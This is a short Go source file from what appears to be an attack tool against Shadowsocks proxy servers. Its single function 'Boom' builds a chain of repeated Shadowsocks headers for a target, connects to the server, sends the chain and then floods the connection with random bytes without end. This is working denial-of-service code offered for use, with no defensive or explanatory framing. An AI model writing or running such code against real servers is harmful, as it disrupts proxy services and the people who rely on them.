package shadowsocks

import (
	"math/rand"

	"github.com/AkinoKaede/sstreamcry/common/internet"
	"github.com/AkinoKaede/sstreamcry/common/net"
)

func Boom(dest net.Destination, account Account, times int) error {
	data := EncodeHeaderChain(dest, account, times)
	conn, err := internet.DialTCP(dest)
	if err != nil {
		return err
	}
	defer conn.Close()

	if _, err := conn.Write(data); err != nil {
		return err
	}

	for {
		if _, err := conn.Write([]byte{byte(rand.Intn(255))}); err != nil {
			return err
		}
	}
}
